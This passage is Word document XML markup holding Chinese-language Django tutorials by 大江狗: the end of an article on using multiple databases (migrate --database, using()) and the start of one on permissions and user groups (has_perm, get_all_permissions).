      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>由于manage.py一次只能创建一个数据库，我们可以使用--database选项来依次创建我们需要的数据库。例如:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF86F3C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将app01下models中的表创建到db01的数据库”db1”中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD017AD" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py  migrate  --database=db1                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5929419B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将app02下models中的表创建到db02的数据库”db2”中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487B257C" w14:textId="06719761" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py  migrate  --database=db2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3759DA6B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在使用多数据库时，我们可以使用using方法来手动选择需要读写的数据库，如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA668A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Aricle.objects.using('db1').all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1D0295" w14:textId="2B6C8E93" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article_object.save(using='db2')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF8BB16" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D2E143B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django中使用多数据库注意事项:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461BD9FD" w14:textId="176E00BF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django 目前不为跨多个数据库的外键关系(ForeinKey)或多对多关系提供任何支持。模型定义的任何外键和多对多关系字段都必须存在一个数据库内。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35868A24" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E592F1" w14:textId="5615A529" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文总结了在Django项目中如何通过优化数据库的设计来提升网站性能, 包括建立数据库索引和使用多数据库，希望对你有所帮助哦。下面起我们将开始介绍Django的权限控制，欢迎关注。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C431FCF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BB2A0D" w14:textId="67B9903E" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.11.19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451491D1" w14:textId="54DF7E2D" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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047</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId284" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(23): 权限管理(permissions)与用户组(group)详解</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="13FD1496"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Django基础(23): 权限管理(permissions)与用户组(group)详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0B8047" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId285" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-11-22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27451011" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8621C9"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Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CED303" w14:textId="1E0D5647" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你只是利用Django开发个博客，大部分用户只是阅读你的文章而已，你可能根本用不到本节内容。但是如果你想开发一个内容管理系统，或用户管理系统，你必需对用户的权限进行管理和控制。Django自带的权限机制(permissions)与用户组(group)可以让我们很方便地对用户权限进行管理。小编我今天就尝试以浅显的语言来讲解下如何使用Django自带的权限管理机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696ABFDB" w14:textId="0469AA21" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是权限?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB65954" w14:textId="604728D6" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>权限是能够约束用户行为和控制页面显示内容的一种机制。一个完整的权限应该包含3个要素: 用户，对象和权限，即什么用户对什么对象有什么样的权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3D75B3" w14:textId="1E4406BA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>假设我们有一个应用叫blog，其包含一个叫Article(文章)的模型。那么一个超级用户一般会有如下4种权限，而一个普通用户可能只有1种或某几种权限，比如只能查看文章，或者能查看和创建文章但是不能修改和删除。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D8FAC5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>查看文章(view)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64190785" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建文章(add)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F425CBF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更改文章(change)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E595149" w14:textId="32C2BEB9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>删除文章(delete) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5AF995" w14:textId="62B128AF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们在Django的admin中是可以很轻易地给用户分配权限的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B05BB12" w14:textId="6512F954" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django Admin中的权限分配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D28A7B" w14:textId="3C1EDCEF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django中的用户权限分配，主要通过Django自带的Admin界面进行维护的。当你编辑某个user信息时, 你可以很轻易地在User permissions栏为其设置对某些模型查看, 增加、更改和删除的权限(如下图所示)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52748DC4" w14:textId="5802FE09" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的权限permission本质是djang.contrib.auth中的一个模型, 其与User的user_permissions字段是多对多的关系。</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当我们在INSTALLED_APP里添加好auth应用之后，Django就会为每一个你安装的app中的模型(Model)自动创建4个可选的权限：view, add,change和delete。(注: Django 2.0前没有view权限)。随后你可以通过admin将这些权限分配给不同用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C59CBF1" w14:textId="670B68CC" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>查看用户的权限</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF1B424" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>权限名一般有app名(app_label)，权限动作和模型名组成。以blog应用为例，Django为Article模型自动创建的4个可选权限名分别为:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6298AFE1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>查看文章(view): blog.view_article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A02CAC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建文章(add): blog.add_article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DE8579" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更改文章(change): blog.change_article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0F6863" w14:textId="6E7E13C2" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>删除文章(delete): blog.delete_article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10249361" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在前例中，我们已经通过Admin给用户A(user_A)分配了创建文章和修改文章的权限。我们现在可以使用user.has_perm()方法来判断用户是否已经拥有相应权限。下例中应该返回True。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6636BBEA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_A.has_perm('blog.add_article')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F9CD3E" w14:textId="09C53B3C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_A.has_perm('blog.change_article')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324397AB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果我们要查看某个用户所在用户组的权限或某个用户的所有权限(包括从用户组获得的权限)，我们可以使用get_group_permissions()和get_all_permissions()方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661E5449" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_A.get_group_permissions()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396F2702" w14:textId="2FEBF290" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_A.get_all_permissions()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215F1337" w14:textId="3B11AB78" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
